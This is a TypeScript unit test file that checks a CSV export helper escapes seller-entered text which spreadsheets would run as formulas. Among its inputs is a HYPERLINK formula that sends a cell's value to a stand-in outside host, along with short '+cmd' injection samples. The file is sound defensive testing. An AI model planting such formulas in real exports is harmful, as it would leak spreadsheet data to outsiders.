import { describe, expect, it } from 'vitest';
import { toCsv, type CsvValue } from '../src/common/csv';

// The Phase 8 close-out's review C, F6: text a seller typed reaches the operator's spreadsheet as text, never as a formula
// it runs; a figure stays a figure; and a feed a machine reads keeps every value as written.
function cell(value: CsvValue, reader?: 'spreadsheet' | 'machine'): string {
  return toCsv([{ value }], ['value'], reader).split('\n').slice(1).join('\n');
}

describe('a CSV cell', () => {
  it('keeps text starting with =, +, -, @, a tab or a carriage return as text, by a leading apostrophe', () => {
    expect(cell('=HYPERLINK("https://x.example/?p="&C2,"Fashion")')).toBe(
      `"'=HYPERLINK(""https://x.example/?p=""&C2,""Fashion"")"`,
    );
    expect(cell('=1+1')).toBe("'=1+1");
    expect(cell('+cmd')).toBe("'+cmd");
    expect(cell('-2+3')).toBe("'-2+3");
    expect(cell('@SUM(A1)')).toBe("'@SUM(A1)");
    expect(cell('\t=1+1')).toBe("'\t=1+1");
    expect(cell('\r=1+1')).toBe(`"'\r=1+1"`);
    expect(cell('- 100% cotton')).toBe("'- 100% cotton");
  });

  it('never touches a plain number, written or counted', () => {
    expect(cell('-5.50')).toBe('-5.50');
    expect(cell('-300.00')).toBe('-300.00');
    expect(cell('+8801711000000')).toBe('+8801711000000');
    expect(cell(-5.5)).toBe('-5.5');
    expect(cell(-1e-7)).toBe('-1e-7');
  });

  it('leaves other text as it was, quoting only commas, quotes and line breaks', () => {
    expect(cell('Rahim Fashion')).toBe('Rahim Fashion');
    expect(cell('a=b')).toBe('a=b');
    expect(cell('Fashion, House')).toBe('"Fashion, House"');
    expect(cell('say "hi"')).toBe('"say ""hi"""');
    expect(cell(null)).toBe('');
    expect(cell(undefined)).toBe('');
  });

  it('starts a cell a spreadsheet would run with a space in a feed a machine reads, never an apostrophe (Slice 9.7)', () => {
    expect(cell('=1+1', 'machine')).toBe(' =1+1');
    expect(cell('+cmd, then', 'machine')).toBe('" +cmd, then"');
    expect(cell('@SUM(A1)', 'machine')).toBe(' @SUM(A1)');
    expect(cell('-2+3+cmd', 'machine')).toBe(' -2+3+cmd');
    // A bullet, a plain number and plain text stay exactly as written.
    expect(cell('- 100% cotton', 'machine')).toBe('- 100% cotton');
    expect(cell('-5.50', 'machine')).toBe('-5.50');
    expect(cell('Cotton shirt', 'machine')).toBe('Cotton shirt');
  });
});
